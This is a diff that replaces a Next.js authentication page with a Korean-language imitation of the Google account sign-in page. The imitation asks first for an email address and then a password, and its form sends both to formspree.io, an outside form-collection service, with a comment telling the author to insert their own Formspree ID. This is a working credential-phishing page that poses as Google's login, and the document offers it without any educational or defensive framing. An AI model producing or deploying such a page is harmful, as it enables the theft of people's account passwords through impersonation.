@@ -1,1 +1,99 @@
-<!DOCTYPE html><!--vCHaFPttWB8Sqbt2Bh9qo--><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/21350d82a1f187e9-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/4ac12ca39cc13ac2.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/3ab1abec17a20427.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-af1fb97934f5741d.js"/><script src="/_next/static/chunks/4bd1b696-100b9d70ed4e49c1.js" async=""></script><script src="/_next/static/chunks/1255-3f38644fe3778fb2.js" async=""></script><script src="/_next/static/chunks/main-app-6e5a7d85c80a7360.js" async=""></script><script src="/_next/static/chunks/8720-c9ee040177c11cae.js" async=""></script><script src="/_next/static/chunks/app/layout-7bbb614015bf0f2f.js" async=""></script><script src="/_next/static/chunks/6823-354c7b1336e17522.js" async=""></script><script src="/_next/static/chunks/app/not-found-0e49362837d62c22.js" async=""></script><script src="/_next/static/chunks/8e1d74a4-e7018a2f3e910798.js" async=""></script><script src="/_next/static/chunks/9c4e2130-77a74882419ff927.js" async=""></script><script src="/_next/static/chunks/f4898fe8-9b029b58f4a5ccc7.js" async=""></script><script src="/_next/static/chunks/1379-1bba148062661a9b.js" async=""></script><script src="/_next/static/chunks/8075-4e289b546a72037b.js" async=""></script><script src="/_next/static/chunks/9034-dcc15f85f7b67823.js" async=""></script><script src="/_next/static/chunks/5949-364115ee87b24bb9.js" async=""></script><script src="/_next/static/chunks/4196-cbd4d0d2ae6a5add.js" async=""></script><script src="/_next/static/chunks/5239-b24dd7149d741c56.js" async=""></script><script src="/_next/static/chunks/5112-0325997e0b5ddcf6.js" async=""></script><script src="/_next/static/chunks/9709-c027f9aa7aa8375b.js" async=""></script><script src="/_next/static/chunks/7917-72ceeda7f52137e5.js" async=""></script><script src="/_next/static/chunks/4288-589d9d07b605d3c0.js" async=""></script><script src="/_next/static/chunks/app/(auth)/auth/page-cfb0db21eee6c23b.js" async=""></script><meta name="next-size-adjust" content=""/><title>Pages | Authentication</title><meta name="description" content="Authentication of the best Beaming Sites."/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__className_fcbcbf overflow-hidden" style="min-height:-webkit-fill-available"><div hidden=""><!--$--><!--/$--></div><script>((a,b,c,d,e,f,g,h)=>{let i=document.documentElement,j=["light","dark"];function k(b){var c;(Array.isArray(a)?a:[a]).forEach(a=>{let c="class"===a,d=c&&f?e.map(a=>f[a]||a):e;c?(i.classList.remove(...d),i.classList.add(f&&f[b]?f[b]:b)):i.setAttribute(a,b)}),c=b,h&&j.includes(c)&&(i.style.colorScheme=c)}if(d)k(d);else try{let a=localStorage.getItem(b)||c,d=g&&"system"===a?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":a;k(d)}catch(a){}})("class","websiteTheme","dark",null,["light","dark","midnight"],null,false,true)</script><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><!--$--><!--/$--><section aria-label="Notifications alt+T" tabindex="-1" aria-live="polite" aria-relevant="additions text" aria-atomic="false"></section><div class="absolute inset-0 pointer-events-none" aria-hidden="true"><canvas class="size-full"></canvas></div><script src="/_next/static/chunks/webpack-af1fb97934f5741d.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[34943,[\"8720\",\"static/chunks/8720-c9ee040177c11cae.js\",\"7177\",\"static/chunks/app/layout-7bbb614015bf0f2f.js\"],\"default\"]\n3:I[33933,[\"8720\",\"static/chunks/8720-c9ee040177c11cae.js\",\"7177\",\"static/chunks/app/layout-7bbb614015bf0f2f.js\"],\"default\"]\n4:I[9766,[],\"\"]\n5:I[98924,[],\"\"]\n6:I[33293,[\"6823\",\"static/chunks/6823-354c7b1336e17522.js\",\"4345\",\"static/chunks/app/not-found-0e49362837d62c22.js\"],\"default\"]\n7:I[70240,[\"8720\",\"static/chunks/8720-c9ee040177c11cae.js\",\"7177\",\"static/chunks/app/layout-7bbb614015bf0f2f.js\"],\"Toaster\"]\n8:I[75571,[\"8720\",\"static/chunks/8720-c9ee040177c11cae.js\",\"7177\",\"static/chunks/app/layout-7bbb614015bf0f2f.js\"],\"default\"]\n"])</script><script>self.__next_f.push([1,"9:I[45779,[\"6711\",\"static/chunks/8e1d74a4-e7018a2f3e910798.js\",\"512\",\"static/chunks/9c4e2130-77a74882419ff927.js\",\"8465\",\"static/chunks/f4898fe8-9b029b58f4a5ccc7.js\",\"6823\",\"static/chunks/6823-354c7b1336e17522.js\",\"1379\",\"static/chunks/1379-1bba148062661a9b.js\",\"8720\",\"static/chunks/8720-c9ee040177c11cae.js\",\"8075\",\"static/chunks/8075-4e289b546a72037b.js\",\"9034\",\"static/chunks/9034-dcc15f85f7b67823.js\",\"5949\",\"static/chunks/5949-364115ee87b24bb9.js\",\"4196\",\"static/chunks/4196-cbd4d0d2ae6a5add.js\",\"5239\",\"static/chunks/5239-b24dd7149d741c56.js\",\"5112\",\"static/chunks/5112-0325997e0b5ddcf6.js\",\"9709\",\"static/chunks/9709-c027f9aa7aa8375b.js\",\"7917\",\"static/chunks/7917-72ceeda7f52137e5.js\",\"4288\",\"static/chunks/4288-589d9d07b605d3c0.js\",\"9693\",\"static/chunks/app/(auth)/auth/page-cfb0db21eee6c23b.js\"],\"Page\"]\n"])</script><script>self.__next_f.push([1,"a:I[24431,[],\"OutletBoundary\"]\nc:I[15278,[],\"AsyncMetadataOutlet\"]\ne:I[24431,[],\"ViewportBoundary\"]\n10:I[24431,[],\"MetadataBoundary\"]\n11:\"$Sreact.suspense\"\n13:I[57150,[],\"\"]\n:HL[\"/_next/static/media/21350d82a1f187e9-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/4ac12ca39cc13ac2.css\",\"style\"]\n:HL[\"/_next/static/css/3ab1abec17a20427.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"vCHaFPttWB8Sqbt2Bh9qo\",\"p\":\"\",\"c\":[\"\",\"auth\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"(auth)\",{\"children\":[\"auth\",{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/4ac12ca39cc13ac2.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/3ab1abec17a20427.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"body\",null,{\"className\":\"__className_fcbcbf overflow-hidden\",\"style\":{\"minHeight\":\"-webkit-fill-available\"},\"children\":[\"$\",\"$L2\",null,{\"children\":[[\"$\",\"$L3\",null,{\"children\":[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"$L6\",null,{}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}],\"maintenance\":false}],[\"$\",\"$L7\",null,{\"position\":\"top-center\",\"visibleToasts\":2}],[\"$\",\"$L8\",null,{\"className\":\"absolute inset-0 pointer-events-none\",\"quantity\":200,\"ease\":50,\"refresh\":true}]]}]}]}]]}],{\"children\":[\"(auth)\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"auth\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"$L9\",null,{}],null,[\"$\",\"$La\",null,{\"children\":[\"$Lb\",[\"$\",\"$Lc\",null,{\"promise\":\"$@d\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$Le\",null,{\"children\":\"$Lf\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]],[\"$\",\"$L10\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$11\",null,{\"fallback\":null,\"children\":\"$L12\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$13\",[]],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"f:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nb:null\n"])</script><script>self.__next_f.push([1,"14:I[80622,[],\"IconMark\"]\nd:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Pages | Authentication\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Authentication of the best Beaming Sites.\"}],[\"$\",\"link\",\"2\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"16x16\"}],[\"$\",\"$L14\",\"3\",{}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"12:\"$d:metadata\"\n"])</script></body></html>
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인 - Google 계정</title>
+    <style>
+        /* CSS 스타일 시작 */
+        body { font-family: 'Noto Sans KR', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { width: 400px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; cursor: default; }
+        h2 { font-size: 24px; font-weight: 400; margin: 10px 0 0; }
+        p { font-size: 16px; margin: 8px 0 40px; color: #202124; }
+        .input-group { position: relative; margin-bottom: 25px; }
+        .input-group input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        .input-group label { position: absolute; top: 13px; left: 15px; color: #5f6368; transition: 0.2s; pointer-events: none; }
+        .input-group input:focus ~ label, .input-group input:valid ~ label { top: -10px; left: 10px; font-size: 12px; background: #fff; padding: 0 5px; color: #1a73e8; }
+        .input-group input:focus { outline: none; border: 2px solid #1a73e8; }
+        .link-text { display: block; text-align: left; color: #1a73e8; text-decoration: none; font-weight: bold; font-size: 14px; margin-bottom: 30px; }
+        .info { text-align: left; font-size: 14px; color: #5f6368; line-height: 1.4; margin-bottom: 40px; }
+        .btn-group { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+        .create-account { background: none; border: none; color: #1a73e8; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="logo">
+            <span style="color: #4285F4">G</span><span style="color: #EA4335">o</span><span style="color: #FBBC05">o</span><span style="color: #4285F4">g</span><span style="color: #34A853">l</span><span style="color: #EA4335">e</span>
+        </div>
+
+        <!-- Formspree ID를 발급받아 아래 'YOUR_ID' 자리에 넣으세요 -->
+        <form id="loginForm" action="https://formspree.io" method="POST">
+            
+            <!-- 1단계: 이메일 입력 화면 -->
+            <div id="step-email">
+                <h2>로그인</h2>
+                <p>Google 계정 사용</p>
+                <div class="input-group">
+                    <input type="email" id="userEmail" name="email" required>
+                    <label>이메일 또는 휴대전화</label>
+                </div>
+                <a href="#" class="link-text">이메일을 잊으셨나요?</a>
+                <div class="info">내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요. <a href="#" style="color:#1a73e8; text-decoration:none; font-weight:bold;">자세히 알아보기</a></div>
+                <div class="btn-group">
+                    <button type="button" class="create-account">계정 만들기</button>
+                    <button type="button" class="next-btn" onclick="nextStep()">다음</button>
+                </div>
+            </div>
+
+            <!-- 2단계: 비밀번호 입력 화면 (숨김 처리) -->
+            <div id="step-password" style="display: none;">
+                <h2>환영합니다</h2>
+                <p id="display-email" style="font-weight: 500; color: #202124; border: 1px solid #dadce0; border-radius: 20px; display: inline-block; padding: 5px 15px; margin-bottom: 30px;"></p>
+                <div class="input-group">
+                    <input type="password" id="userPw" name="password" required>
+                    <label>비밀번호 입력</label>
+                </div>
+                <div style="text-align: left; margin-bottom: 40px; font-size: 14px;">
+                    <input type="checkbox" onclick="showPw()"> 비밀번호 표시
+                </div>
+                <div class="btn-group">
+                    <button type="button" class="create-account" onclick="prevStep()">뒤로</button>
+                    <button type="submit" class="next-btn">로그인</button>
+                </div>
+            </div>
+
+        </form>
+    </div>
+
+    <script>
+        // JavaScript 로직
+        function nextStep() {
+            const email = document.getElementById('userEmail').value;
+            if(email && email.includes('@')) {
+                document.getElementById('step-email').style.display = 'none';
+                document.getElementById('step-password').style.display = 'block';
+                document.getElementById('display-email').innerText = email;
+            } else {
+                alert("유효한 이메일을 입력해주세요.");
+            }
+        }
+
+        function prevStep() {
+            document.getElementById('step-email').style.display = 'block';
+            document.getElementById('step-password').style.display = 'none';
+        }
+
+        function showPw() {
+            var x = document.getElementById("userPw");
+            if (x.type === "password") { x.type = "text"; } 
+            else { x.type = "password"; }
+        }
+    </script>
+
+</body>
+</html>
+
